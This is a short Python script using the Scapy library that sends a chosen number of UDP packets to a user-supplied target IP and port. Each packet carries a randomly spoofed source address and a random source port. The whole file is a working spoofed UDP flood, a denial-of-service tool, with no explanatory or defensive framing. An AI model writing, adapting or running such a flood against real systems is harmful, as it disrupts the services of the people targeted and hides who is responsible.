#!/usr/bin/python
from scapy.all import IP,UDP,RandIP,send
from random import randrange
ip = raw_input("Target IP: ")
port = input("Port: ")
times = input("Packet Nums: ")
b=IP(src=RandIP(),dst=ip,ttl=10)
c=UDP(dport=port)
tmp=1
while(True):
    randport = randrange(1025,65535,1)
    c.sport = randport
    a=b/c
    send(a)
    if (tmp == times):
        break
    else:
        tmp = tmp + 1
